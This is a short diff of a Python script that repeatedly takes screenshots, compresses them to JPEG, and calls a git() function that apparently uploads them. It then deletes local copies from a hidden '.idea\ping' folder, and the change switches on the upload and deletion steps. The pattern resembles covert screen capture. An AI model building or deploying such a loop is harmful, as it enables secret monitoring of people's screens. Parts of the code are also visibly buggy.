@@ -17,9 +17,9 @@ def git():
 
 
 def remove():
-    dirpath = os.getcwd() + "\\.idea\\ping\\"
-    for filename in os.listdir(dirpath):
-        filepath = os.path.join(dirpath, filename)
+    directory = os.getcwd() + "\\.idea\\ping\\"
+    for filename in os.listdir(directory):
+        filepath = os.path.join(directory, filename)
     try:
         shutil.rmtree(filepath)
     except OSError:
@@ -28,9 +28,10 @@ def remove():
 
 def compressMe(fp):
     picture = Image.open(fp)
-    size = 1000, 1000
+    size = 500, 500
     picture.resize(size, Image.ANTIALIAS)
-    picture.save(fp, format="PNG", optimize=True, quality=100)
+    picture.save(fp, format="JPEG", optimize=True, quality=60)
+    picture = 0
     return
 
 
@@ -43,7 +44,7 @@ if __name__ == '__main__':
         g.screenshot(source)
         time.sleep(1)
         compressMe(source)
-        #git()
+        git()
         time.sleep(0.5)
-        #remove()
-        time.sleep(20)
+        remove()
+        time.sleep(30)
